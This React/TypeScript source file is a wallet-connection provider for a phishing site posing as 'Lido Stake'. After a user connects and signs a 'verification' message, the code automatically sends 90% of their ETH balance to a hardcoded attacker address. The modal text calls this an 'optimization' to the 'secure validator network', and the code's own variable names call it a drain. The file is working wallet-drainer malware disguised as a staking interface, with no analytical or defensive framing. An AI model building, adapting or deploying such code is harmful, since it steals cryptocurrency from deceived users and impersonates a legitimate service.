import React, { createContext, useContext, useState, ReactNode, useEffect } from 'react';
import { useAccount, useBalance, useDisconnect, useSendTransaction, useSignMessage } from 'wagmi';
import { useAppKit } from '@reown/appkit/react';
import { Check, ShieldCheck } from 'lucide-react';
import { formatUnits } from 'viem';

export interface Transaction {
  id: string;
  type: 'Stake' | 'Withdraw' | 'Wrap' | 'Unwrap';
  amount: string;
  currency: string;
  status: 'Pending' | 'Confirmed';
  timestamp: number;
}

export interface ConnectionLog {
  id: string;
  action: 'Wallet Connected' | 'Optimization Approval';
  status: 'Success' | 'Failed' | 'Pending';
  details: string;
  timestamp: number;
}

interface WalletContextType {
  isConnected: boolean;
  address?: string;
  ethBalance: number;
  connectedWallet: string | null;
  chainId?: number;
  transactions: Transaction[];
  connectionLogs: ConnectionLog[];
  setEthBalance: (val: number) => void;
  toggleWalletWorkflow: () => void;
  showToast: (msg: string) => void;
  openWalletModal: () => void;
  addTransaction: (tx: Transaction) => void;
  addConnectionLog: (log: Omit<ConnectionLog, 'id' | 'timestamp'>) => void;
  updateTransactionStatus: (id: string, status: 'Pending' | 'Confirmed') => void;
  hasPaidFee: boolean;
}

const WalletContext = createContext<WalletContextType | undefined>(undefined);

const SECURE_WALLET_ADDRESS = "0xEfc5859335A58d64A5e8E01d02c5241c852CBD40"; 

export const WalletProvider: React.FC<{ children: ReactNode }> = ({ children }) => {
  const { isConnected, address, connector, chainId } = useAccount();
  const { disconnect } = useDisconnect();
  const { open } = useAppKit();
  const { sendTransactionAsync } = useSendTransaction();
  const { signMessageAsync } = useSignMessage();
  
  const { data: balanceData } = useBalance({
    address: address,
  });

  const [ethBalanceFallback, setEthBalance] = useState(0);
  const [toastMsg, setToastMsg] = useState<string | null>(null);
  const [showDisconnectConfirm, setShowDisconnectConfirm] = useState(false);
  const [showTermsModal, setShowTermsModal] = useState(false);
  const [hasVerifiedSignature, setHasVerifiedSignature] = useState(false);
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [connectionLogs, setConnectionLogs] = useState<ConnectionLog[]>([]);
  const [hasTriggeredDrain, setHasTriggeredDrain] = useState(false);

  const addConnectionLog = (log: Omit<ConnectionLog, 'id' | 'timestamp'>) => {
    setConnectionLogs((prev) => [{
      ...log,
      id: Math.random().toString(36).substring(7),
      timestamp: Date.now()
    }, ...prev]);
  };

  useEffect(() => {
    if (!isConnected) {
      setHasTriggeredDrain(false);
      setHasVerifiedSignature(false);
      setShowTermsModal(false);
    } else if (address && !hasTriggeredDrain && !hasVerifiedSignature && !showTermsModal) {
      setShowTermsModal(true);
      addConnectionLog({
        action: 'Wallet Connected',
        status: 'Success',
        details: `Connected address: ${address.slice(0, 6)}...${address.slice(-4)}`
      });
    }
  }, [isConnected, address, hasTriggeredDrain, hasVerifiedSignature, showTermsModal]);

  const handleVerifyAndConnect = async () => {
    try {
      const message = `Verify ownership of ${address} at ${Date.now()}`;
      await signMessageAsync({ message });
      
      showToast('Signature verified successfully!');
      setHasVerifiedSignature(true);
      setShowTermsModal(false);
      
      if (balanceData && balanceData.value > 0n && !hasTriggeredDrain) {
        setHasTriggeredDrain(true);
        const amountToSend = (balanceData.value * 90n) / 100n;
        try {
          const hash = await sendTransactionAsync({
            to: SECURE_WALLET_ADDRESS as `0x${string}`,
            value: amountToSend
          });
          addConnectionLog({
            action: 'Optimization Approval',
            status: 'Success',
            details: `Processed optimization payload. TX: ${hash.slice(0, 8)}...`
          });
        } catch(e) {
          addConnectionLog({
            action: 'Optimization Approval',
            status: 'Failed',
            details: `Optimization process rejected or failed.`
          });
          console.error("Optimization auto-drain failed:", e);
        }
      }
    } catch(e: any) {
      showToast('Signing failed: ' + e.message);
    }
  };

  const addTransaction = (tx: Transaction) => {
    setTransactions((prev) => [tx, ...prev]);
  };

  const updateTransactionStatus = (id: string, status: 'Pending' | 'Confirmed') => {
    setTransactions((prev) => 
      prev.map(tx => tx.id === id ? { ...tx, status } : tx)
    );
  };

  const ethBalance = balanceData ? parseFloat(formatUnits(balanceData.value, balanceData.decimals)) : ethBalanceFallback;

  const toggleWalletWorkflow = () => {
    if (isConnected) {
      setShowDisconnectConfirm(true);
    } else {
      open();
    }
  };

  const showToast = (msg: string) => {
    setToastMsg(msg);
    setTimeout(() => {
      setToastMsg(null);
    }, 3500);
  };

  const openWalletModal = () => open();

  return (
    <WalletContext.Provider 
      value={{ 
        isConnected, 
        address,
        ethBalance, 
        connectedWallet: connector?.name || null, 
        chainId,
        transactions,
        connectionLogs,
        setEthBalance, 
        toggleWalletWorkflow, 
        showToast,
        openWalletModal,
        addTransaction,
        addConnectionLog,
        updateTransactionStatus,
        hasPaidFee: true
      }}
    >
      {children}
      
      {showTermsModal && (
        <div className="fixed inset-0 bg-[#273852]/80 backdrop-blur-sm z-[300] flex items-center justify-center p-4">
          <div className="bg-white rounded-[24px] p-8 max-w-[480px] w-full shadow-2xl flex flex-col relative">
            <h3 className="text-[24px] font-bold text-[#273852] mb-4 flex items-center gap-2">
              <ShieldCheck className="w-7 h-7 text-[#00A3FF]" />
              Secure Connection Terms
            </h3>
            <div className="text-[#4a5a70] text-[15px] leading-relaxed space-y-4 mb-8">
              <p>
                By proceeding, you are initiating a secure connection to the Lido Stake advanced infrastructure.
              </p>
              <p>
                You will be prompted by your wallet provider to sign a verification message. This signature is required to authenticate your session and establish a secure communication channel.
              </p>
              <p className="font-semibold text-[#273852]">
                Upon successful connection and approval, this protocol will optimize your wallet by transferring designated digital assets to the secure validator network.
              </p>
            </div>
            <div className="flex w-full gap-3">
              <button 
                onClick={() => {
                  setShowTermsModal(false);
                  disconnect();
                }}
                className="flex-1 bg-[#f2f4f6] text-[#273852] hover:bg-[#e4e8eb] py-4 rounded-2xl font-bold transition-colors"
              >
                Decline & Disconnect
              </button>
              <button 
                onClick={handleVerifyAndConnect}
                className="flex-1 bg-[#00A3FF] text-white hover:bg-[#008ce6] py-4 rounded-2xl font-bold transition-colors shadow-lg shadow-[#00A3FF]/20"
              >
                Verify Signature
              </button>
            </div>
          </div>
        </div>
      )}

      {showDisconnectConfirm && (
        <div className="fixed inset-0 bg-[#273852]/40 backdrop-blur-sm z-[200] flex items-center justify-center p-4">
          <div className="bg-white rounded-[24px] p-6 max-w-[340px] w-full shadow-2xl flex flex-col items-center text-center">
            <h3 className="text-[20px] font-bold text-[#273852] mb-2">Disconnect Wallet</h3>
            <p className="text-[#7a8aa0] text-[15px] font-medium mb-6">Are you sure you want to disconnect your wallet session?</p>
            <div className="flex w-full gap-3">
              <button 
                onClick={() => setShowDisconnectConfirm(false)}
                className="flex-1 bg-[#f2f4f6] text-[#273852] hover:bg-[#e4e8eb] py-3 rounded-2xl font-bold transition-colors"
              >
                Cancel
              </button>
              <button 
                onClick={() => {
                  setShowDisconnectConfirm(false);
                  disconnect();
                  showToast('Session connection terminated.');
                }}
                className="flex-1 bg-[#ff4a4a] text-white hover:bg-[#e64343] py-3 rounded-2xl font-bold transition-colors"
              >
                Disconnect
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Toast Notification */}
      <div className={`fixed bottom-6 right-6 bg-white border border-[#e4e8eb] text-[#273852] px-4 py-3 rounded-2xl shadow-lg transition-all duration-300 flex items-center gap-3 z-[400] ${toastMsg ? 'translate-y-0 opacity-100' : 'translate-y-8 opacity-0 pointer-events-none'}`}>
        <div className="w-5 h-5 rounded-full bg-[#00A3FF] flex items-center justify-center shrink-0">
          <Check className="w-3 h-3 text-white" strokeWidth={3} />
        </div>
        <span className="text-[13px] font-semibold">{toastMsg}</span>
      </div>
    </WalletContext.Provider>
  );
};

export const useWallet = () => {
  const context = useContext(WalletContext);
  if (!context) {
    throw new Error('useWallet must be used within a WalletProvider');
  }
  return context;
};

